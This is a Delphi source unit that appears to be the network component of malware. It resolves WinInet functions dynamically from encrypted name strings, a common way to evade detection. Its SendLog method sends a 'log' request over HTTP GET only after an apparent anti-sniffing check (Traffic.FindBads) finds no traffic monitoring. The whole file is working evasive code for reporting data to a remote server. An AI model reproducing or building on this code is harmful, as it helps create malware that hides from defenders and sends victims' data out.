unit Internet;

interface

uses Windows, WinInet, AntiSniffModule, ImportsDoctor, MemStrTools, commonDefs;

type
	InetOpenPROTO = function(lpszAgent: PAnsiChar; dwAccessType: DWORD; lpszProxy, lpszProxyBypass: PAnsiChar; dwFlags: DWORD): Pointer; stdcall;
	InetOpenUrlPROTO = function(hInet: Pointer; lpszUrl: PAnsiChar; lpszHeaders: PAnsiChar; dwHeadersLength: DWORD; dwFlags: DWORD; dwContext: DWORD): Pointer; stdcall;
	InetReadFilePROTO = function(hFile: Pointer; lpBuffer: Pointer; dwNumberOfBytesToRead: DWORD; var lpdwNumberOfBytesRead: DWORD): BOOL; stdcall;
	InetCloseHandlePROTO = function(hInet: Pointer): BOOL; stdcall;

	InetClass = class
		lpInternetOpen: InetOpenPROTO;
		lpInternetOpenUrlA: InetOpenUrlPROTO;
		lpInternetReadFile: InetReadFilePROTO;
		lpInternetCloseHandle: InetCloseHandlePROTO;
		internet, UrlHandle:Pointer;
		Buffer: array[0..1023] of byte;
		BytesRead: dWord;
		StrBuffer: UTF8String;
		Wininet: Cardinal;
		lock: Boolean;
		private
			function GETRequest(request: string):string;
		public
			constructor Create;
			function SendLog(request: PChar):string;
	end;
	
var
	Inet: InetClass;

implementation

constructor InetClass.Create();
begin
	Wininet := GetModuleHandle(PChar(Tools.Crypt(COMDEF_LIBRARY_WININET, false)));
	if Wininet=0 then Wininet := LoadLibrary(PChar(Tools.Crypt(COMDEF_LIBRARY_WININET, false)));
	@lpInternetOpen := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETOPEN, false)));
	@lpInternetOpenUrlA := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETOPENURL, false)));
	@lpInternetReadFile := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETREADFILE, false)));
	@lpInternetCloseHandle := GetProcAddress(Wininet, PChar(Tools.Crypt(COMDEF_FUNCTION_INETCLOSEHANDLE, false)));
	lock := false;
end;

{$O-}
function InetClass.GETRequest(request: string): string;
begin
	internet := lpInternetOpen(PChar(Tools.Crypt(COMDEF_INTERNET_AGENT, false)), INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);
	UrlHandle := lpInternetOpenUrlA(internet, PChar(request), nil, 0, INTERNET_FLAG_RELOAD, 0);
	if Assigned(UrlHandle) then
	try
		repeat
			lpInternetReadFile(UrlHandle, @Buffer, SizeOf(Buffer), BytesRead);
			SetString(StrBuffer, PAnsiChar(@Buffer[0]), BytesRead);
			Result := Result + StrBuffer;
		lock := false;
		until BytesRead = 0;
	finally
		lpInternetCloseHandle(internet);
		lpInternetCloseHandle(UrlHandle);
		lock := false;
	end;
end;
{$O+}

function InetClass.SendLog(request: PChar):string;
var
	tempbuf: array [0..1023] of char;
	tmp: string;
begin
	Result := '';
	lstrcpy(@tempbuf, request);
	if Traffic.FindBads=false then
	begin
		while self.lock do Sleep(50);
		lock := true;
		Result := GETRequest(tempbuf);
	end
end;

end.